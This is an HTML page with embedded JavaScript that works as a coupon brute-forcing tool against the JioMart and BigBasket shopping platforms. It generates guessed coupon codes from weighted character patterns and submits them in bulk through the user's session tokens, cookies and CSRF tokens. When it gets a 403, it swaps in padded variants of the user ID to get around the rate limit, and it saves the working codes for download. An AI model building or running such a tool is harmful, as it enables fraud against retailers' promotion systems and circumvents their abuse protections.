<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>JioMart & BigBasket Coupon Generator & Checker</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
    <style>
      .sticky-top {
        position: sticky;
        top: 0;
        z-index: 2;
      }
      .hidden {
        display: none;
      }
    </style>
  </head>
  <body class="p-4 bg-light">
    <div class="container">
      <h1 class="mb-4">🎟️ Coupon Generator & Checker</h1>

      <!-- User Inputs -->
      <form id="configForm" class="row g-3 mb-4">
        <div class="col-12">
          <label class="form-label">Platform</label>
          <select class="form-select" id="platform">
            <option value="jiomart" selected>JioMart</option>
            <option value="bigbasket">BigBasket</option>
          </select>
        </div>
        
        <!-- JioMart Fields -->
        <div class="jiomart-fields">
          <div class="row g-3">
            <div class="col-md-6">
              <label class="form-label">Cart ID</label>
              <input class="form-control" id="cartId" />
            </div>
            <div class="col-md-6">
              <label class="form-label">Auth Token</label>
              <input class="form-control" id="authToken" />
            </div>
            <div class="col-md-6">
              <label class="form-label">User ID</label>
              <input class="form-control" id="userId" />
            </div>
            <div class="col-md-6">
              <label class="form-label">PINCODE</label>
              <input class="form-control" id="pin" />
            </div>
          </div>
        </div>

        <!-- BigBasket Fields -->
        <div class="bigbasket-fields hidden">
          <div class="row g-3">
            <div class="col-md-6">
              <label class="form-label">Transaction ID (bb_txn_id)</label>
              <input class="form-control" id="bbTxnId" />
            </div>
            <div class="col-md-6">
              <label class="form-label">Potential Order ID (po_id)</label>
              <input class="form-control" id="poId" />
            </div>
            <div class="col-12">
              <label class="form-label">CSRF Token (x-csurftoken)</label>
              <input class="form-control" id="csurftoken" />
            </div>
            <div class="col-12">
              <label class="form-label">Cookie</label>
              <textarea class="form-control" id="cookie" rows="3"></textarea>
            </div>
          </div>
        </div>
        
        <div class="col-md-4">
          <label class="form-label">How many coupons?</label>
          <input type="number" class="form-control" id="count" value="10" min="1" />
        </div>
        <div class="col-md-4">
          <label class="form-label">Prefix (optional)</label>
          <input class="form-control" id="prefix" placeholder="e.g. T25 or M7N" />
        </div>
        <div class="col-md-4">
          <label class="form-label">Mode</label>
          <select class="form-select" id="mode">
            <option value="auto" selected>Auto (detect by prefix)</option>
            <option value="alternating">Alternating (Digit + Letter)</option>
            <option value="numeric">Numeric (T + 10 digits)</option>
          </select>
        </div>
        <div class="col-12">
          <label class="form-label">Custom Coupon List (optional)</label>
          <textarea class="form-control" id="customCoupons" rows="4" placeholder="Paste coupons here..."></textarea>
        </div>
        <div class="col-12 d-flex gap-2">
          <button class="btn btn-primary w-100">Generate / Check</button>
          <button type="button" id="downloadBtn" class="btn btn-success">⬇️ Download Valid Codes</button>
        </div>
      </form>

      <!-- Results Table -->
      <div class="card shadow-sm">
        <div class="card-body">
          <h4>Results</h4>
          <div style="max-height: 400px; overflow-y: auto;">
            <table class="table table-bordered table-striped">
              <thead class="table-light sticky-top">
                <tr>
                  <th>#</th>
                  <th>Coupon</th>
                  <th>Status</th>
                  <th>Message</th>
                  <th>ID</th>
                </tr>
              </thead>
              <tbody id="resultTable"></tbody>
            </table>
          </div>
        </div>
      </div>
    </div>

    <script>
      const digitWeights = { "1":0.2,"8":0.2,"9":0.18,"6":0.15,"0":0.12,"4":0.1,"2":0.015,"3":0.015,"5":0.015,"7":0.015 };
      const letterWeights = {Z:.1,C:.1,N:.1,L:.08,J:.08,E:.08,A:.08,R:.07,T:.07,U:.06,W:.04,Y:.04,O:.04,Q:.03,K:.03,S:.03,D:.02,G:.02,X:.02,H:.02,F:.01,V:.01,M:.005,P:.005,B:.005,I:.005};
      "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("").forEach(l=>{if(!letterWeights[l]) letterWeights[l]=0.001;});

      function weightedChoice(weights){const items=Object.keys(weights);const probs=Object.values(weights);const total=probs.reduce((a,b)=>a+b,0);let r=Math.random()*total;for(let i=0;i<items.length;i++){r-=probs[i];if(r<=0) return items[i];}return items[items.length-1];}

      function generateCoupon(prefixInput="",mode="auto"){
        const cleanPrefix=(prefixInput||"").toUpperCase().replace(/[^A-Z0-9]/g,"");
        if(mode==="numeric"||(mode==="auto"&&/^T\d*$/.test(cleanPrefix))){
          let code=cleanPrefix.length>0?cleanPrefix.slice(0,10):"T";
          while(code.length<10) code+=Math.floor(Math.random()*10);
          return code;
        }
        let code=cleanPrefix.slice(0,10);
        let nextShouldBeDigit=code.length===0?true:isNaN(code[code.length-1]);
        while(code.length<10){
          code+=nextShouldBeDigit?weightedChoice(digitWeights):weightedChoice(letterWeights);
          nextShouldBeDigit=!nextShouldBeDigit;
        }
        return code;
      }

      function generateBigBasketCoupon(prefixInput=""){
        // BigBasket coupon format: BBSAVE150-4 + 15 random alphanumeric characters
        // Example: BBSAVE150-4RMY02FEAGKBRP1
        const defaultPrefix = "BBSAVE150-4";
        const cleanPrefix = (prefixInput || defaultPrefix).toUpperCase();
        const targetLength = 26; // Total length of BigBasket coupons
        
        // Validate prefix length - truncate if too long, use default if invalid
        let code;
        if(cleanPrefix.length >= targetLength) {
          console.warn("Prefix too long, truncating to fit");
          code = cleanPrefix.slice(0, targetLength - 1);
        } else {
          code = cleanPrefix;
        }
        
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        while(code.length < targetLength) {
          code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return code;
      }

      function* userIdGenerator(baseUserId){for(let i=1;i<=127;i++)yield"0".repeat(i)+baseUserId;for(let i=1;i<=125;i++)yield"+"+"0".repeat(i)+baseUserId;}
      const sleep=ms=>new Promise(r=>setTimeout(r,ms));

      let validCoupons=[]; // ✅ store working coupons

      // Platform toggle handler
      document.getElementById("platform").addEventListener("change", function() {
        const platform = this.value;
        const jiomartFields = document.querySelector(".jiomart-fields");
        const bigbasketFields = document.querySelector(".bigbasket-fields");
        const prefixInput = document.getElementById("prefix");
        const modeSelect = document.getElementById("mode");
        
        // Get field references
        const cartId = document.getElementById("cartId");
        const authToken = document.getElementById("authToken");
        const userId = document.getElementById("userId");
        const pin = document.getElementById("pin");
        const bbTxnId = document.getElementById("bbTxnId");
        const poId = document.getElementById("poId");
        const csurftoken = document.getElementById("csurftoken");
        const cookie = document.getElementById("cookie");
        
        if (platform === "jiomart") {
          jiomartFields.classList.remove("hidden");
          bigbasketFields.classList.add("hidden");
          prefixInput.placeholder = "e.g. T25 or M7N";
          modeSelect.parentElement.style.display = "block";
          
          // Set required for JioMart fields
          cartId.required = true;
          authToken.required = true;
          userId.required = true;
          pin.required = true;
          
          // Remove required for BigBasket fields
          bbTxnId.required = false;
          poId.required = false;
          csurftoken.required = false;
          cookie.required = false;
        } else {
          jiomartFields.classList.add("hidden");
          bigbasketFields.classList.remove("hidden");
          prefixInput.placeholder = "e.g. BBSAVE150-4 (default)";
          modeSelect.parentElement.style.display = "none";
          
          // Remove required for JioMart fields
          cartId.required = false;
          authToken.required = false;
          userId.required = false;
          pin.required = false;
          
          // Set required for BigBasket fields
          bbTxnId.required = true;
          poId.required = true;
          csurftoken.required = true;
          cookie.required = true;
        }
      });

      document.getElementById("configForm").addEventListener("submit",async e=>{
        e.preventDefault();
        validCoupons=[];

        const platform = document.getElementById("platform").value;
        const count=parseInt(document.getElementById("count").value);
        const prefix=document.getElementById("prefix").value.trim();
        const mode=document.getElementById("mode").value;
        const customCoupons=document.getElementById("customCoupons").value.trim();

        const tableBody=document.getElementById("resultTable");tableBody.innerHTML="";
        let coupons=[];
        if(customCoupons.length>0){
          coupons=customCoupons.split("\n").map(c=>c.trim()).filter(Boolean);
        } else {
          const generated=new Set();
          while(coupons.length<count){
            const c = platform === "bigbasket" ? generateBigBasketCoupon(prefix) : generateCoupon(prefix,mode);
            if(!generated.has(c)){
              generated.add(c);
              coupons.push(c);
            }
          }
        }

        if (platform === "jiomart") {
          await checkJioMartCoupons(coupons, tableBody);
        } else {
          await checkBigBasketCoupons(coupons, tableBody);
        }
      });

      async function checkJioMartCoupons(coupons, tableBody) {
        const cartId=document.getElementById("cartId").value;
        const authToken=document.getElementById("authToken").value;
        const baseUserId=document.getElementById("userId").value;
        const pin=document.getElementById("pin").value;

        const userIds=userIdGenerator(baseUserId);let currentUserId=baseUserId;let couponCounter=0;

        for(let i=0;i<coupons.length;i++){const coupon=coupons[i];const row=document.createElement("tr");
          row.innerHTML=`<td>${i+1}</td><td>${coupon}</td><td>⏳ Checking...</td><td></td><td>${currentUserId}</td>`;tableBody.appendChild(row);
          try{
            const res=await fetch("/api/check-coupon",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({coupon,cartId,authToken,userId:currentUserId,pin})});
            if(res.status===403){const nextId=userIds.next();if(!nextId.done){currentUserId=nextId.value;console.warn("⚠️ 403 → switched User ID:",currentUserId);}i--;row.remove();continue;}
            const data=await res.json();

            if(data.result?.status==="success"||data.result?.result?.[0]?.applicable){const info=data.result?.additional_general_info||{};
              row.cells[2].innerHTML="✅ Valid";row.cells[3].innerHTML=`SUCCESS - cart_id: ${info.cart_id||"?"}, customer_id: ${info.customer_id||"?"}`;row.className="table-success";
              tableBody.insertBefore(row,tableBody.firstChild);
              validCoupons.push(coupon); // ✅ save working coupon
            } else if(data.error){const reasonObj=data.error.reason||{};row.cells[2].innerHTML="❌ Invalid";row.cells[3].innerHTML=`${reasonObj.reason_code||"UNKNOWN"} - ${reasonObj.reason_eng||"Unknown"}`;row.className="table-danger";}
            else{const reasonObj=data.result?.reason||data.result?.result?.[0]||{};row.cells[2].innerHTML="❌ Invalid";row.cells[3].innerHTML=`${reasonObj.reason_code||"UNKNOWN"} - ${reasonObj.reason_eng||"Unknown"}`;row.className="table-danger";}
          }catch(err){row.cells[2].innerHTML="⚠️ Error";row.cells[3].innerHTML=err.message;row.className="table-warning";}

          couponCounter++;if(couponCounter%6===0){const nextId=userIds.next();if(!nextId.done)currentUserId=nextId.value;}
          if(i<coupons.length-1)await sleep(3000);
        }
      }

      async function checkBigBasketCoupons(coupons, tableBody) {
        const bbTxnId = document.getElementById("bbTxnId").value;
        const poId = document.getElementById("poId").value;
        const csurftoken = document.getElementById("csurftoken").value;
        const cookie = document.getElementById("cookie").value;

        for(let i=0;i<coupons.length;i++){
          const voucher_code=coupons[i];
          const row=document.createElement("tr");
          row.innerHTML=`<td>${i+1}</td><td>${voucher_code}</td><td>⏳ Checking...</td><td></td><td>N/A</td>`;
          tableBody.appendChild(row);
          
          try{
            const res=await fetch("/api/check-bigbasket-coupon",{
              method:"POST",
              headers:{"Content-Type":"application/json"},
              body:JSON.stringify({voucher_code, bb_txn_id: bbTxnId, po_id: poId, csurftoken, cookie})
            });
            
            const data=await res.json();

            // Check if there are errors
            if(data.result?.errors && data.result.errors.length > 0) {
              const error = data.result.errors[0];
              row.cells[2].innerHTML="❌ Invalid";
              row.cells[3].innerHTML=`${error.code_str||error.code||"ERROR"} - ${error.display_msg||error.msg||"Unknown error"}`;
              row.className="table-danger";
            } 
            // Check if voucher is valid
            else if(data.result && !data.result.errors) {
              row.cells[2].innerHTML="✅ Valid";
              row.cells[3].innerHTML=`SUCCESS - Voucher applied`;
              row.className="table-success";
              tableBody.insertBefore(row,tableBody.firstChild);
              validCoupons.push(voucher_code);
            }
            // Handle other error formats
            else if(data.error){
              row.cells[2].innerHTML="❌ Invalid";
              row.cells[3].innerHTML=`ERROR - ${JSON.stringify(data.error)}`;
              row.className="table-danger";
            }
            else {
              row.cells[2].innerHTML="⚠️ Unknown";
              row.cells[3].innerHTML="Unexpected response format";
              row.className="table-warning";
            }
          }catch(err){
            row.cells[2].innerHTML="⚠️ Error";
            row.cells[3].innerHTML=err.message;
            row.className="table-warning";
          }

          if(i<coupons.length-1)await sleep(3000);
        }
      }

      // ⬇️ Download Button
      document.getElementById("downloadBtn").addEventListener("click",()=>{
        if(validCoupons.length===0){alert("No valid coupons to download!");return;}
        const blob=new Blob([validCoupons.join("\n")],{type:"text/plain"});
        const url=URL.createObjectURL(blob);
        const a=document.createElement("a");
        a.href=url;a.download="valid_coupons.txt";a.click();
        URL.revokeObjectURL(url);
      });

      // Initialize required fields on page load (JioMart is default)
      document.addEventListener("DOMContentLoaded", function() {
        document.getElementById("cartId").required = true;
        document.getElementById("authToken").required = true;
        document.getElementById("userId").required = true;
        document.getElementById("pin").required = true;
      });
    </script>
  </body>
</html>
